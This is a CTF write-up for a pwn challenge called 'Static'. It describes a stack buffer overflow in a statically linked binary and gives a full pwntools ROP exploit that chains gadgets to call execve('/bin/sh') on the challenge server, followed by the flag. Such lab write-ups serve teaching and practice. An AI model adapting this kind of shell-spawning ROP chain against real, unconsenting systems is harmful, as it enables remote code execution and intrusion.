https://ctftime.org/event/2252/

# Static (Pwn)

So I heard all about these binary exploitation attacks involving libraries and libc, and that's got me worried! I decided to statically compile all of my binaries to avoid those attack vectors. This means I don't need to worry about mitigations, right?

Right??

nc static.chal.cyberjousting.com 1350

## Binary Analysis

`vuln` @ `0x004017e8`:
- `read`'s up to `0x100` bytes to a buffer on the stack at `-0x12`

The binary is statically linked.

## Solution

We will use a `syscall` gadget to perform `execve("/bin/sh\x00", 0, 0)`.

### Preparing String Arguments

In order to make the call to `execve` we need to be able to point to the string `"/bin/sh\x00"`.

Through debugging its possible to determine that value of the register `rsi` closely relates to address of the start the buffer we control on the stack.

By starting our payload with `"/bin/sh\x00"` and then copying from and making adjustments to the value in `rsi` we are able to set `rdi = "/bin/sh\x00"`.

### Collecting Gadgets

Much of the challenge of this task comes from the limited availability of gadgets.

Gadgets were discovered using `ROPgadget` as follows:

```
$ ROPgadget --binary ./static
```

A particular challenge for me taking control over `rdi` which should point to the string `"/bin/sh\x00"` in memory when calling `execve`.

I ended up using a combination of the following:

```
# 0x464c94 : lea rdx, [rax + 8] ; cmp rcx, rsi ; jb 0x464c81 ; ret
# 0x4299de : mov rdi, rdx ; call rsi ;
```

I won't go over every gadget here instead see the final exploit for the final selection.

### Final Exploit

Note that great care is taken to ensure that both `rsi` and `rdx`, that is the values of `argv` and `envp`, are set to `0` prior to the `syscall` instruction's execution.

```
from pwn import *

p = remote("static.chal.cyberjousting.com", 1350)

SYSCALL = 0x401194
POP_RAX = 0x41069c
POP_RSI = 0x4062d8
POP_RBP = 0x401761
POP_R15 = 0x401fdf
POP_RBX = 0x40166f
POP_R12 = 0x4023e7
MOV_RAX_RSI = 0x425d07
ADD_RAX_RSI = 0x426534
MOV_RCX_RAX_MOV_RAX_RCX = 0x404606
MOV_RDI_RDX_CALL_RSI = 0x4299de
MOV_RSI_RBP_CALL_R15 = 0x45edc9
MOV_RDX_RBP_CALL_RBX = 0x44499e

# 0x464c94 : lea rdx, [rax + 8] ; cmp rcx, rsi ; jb 0x464c81 ; ret
LEA_RDX_RAX = 0x464c94

payload = b""
payload += b"/bin/sh\x00"
payload = payload.rjust(0x12, b"A")
payload += p64(POP_RAX)
payload += p64(1)
payload += p64(MOV_RCX_RAX_MOV_RAX_RCX)
payload += p64(MOV_RAX_RSI)
payload += p64(POP_RSI)
payload += p64(2)
payload += p64(ADD_RAX_RSI)
payload += p64(POP_RSI)
payload += p64(0)
payload += p64(LEA_RDX_RAX)
payload += p64(POP_RAX)
payload += p64(0x3b) # EXECVE
payload += p64(POP_RBP)
payload += p64(0)
payload += p64(POP_RBX)
payload += p64(SYSCALL)
payload += p64(POP_R15)
payload += p64(MOV_RDX_RBP_CALL_RBX)
payload += p64(POP_RSI)
payload += p64(MOV_RSI_RBP_CALL_R15)
payload += p64(MOV_RDI_RDX_CALL_RSI)

p.sendline(payload)

p.interactive()
```

## Flag
`byuctf{glaD_you_c0uld_improvise_ROP_with_no_provided_gadgets!}`
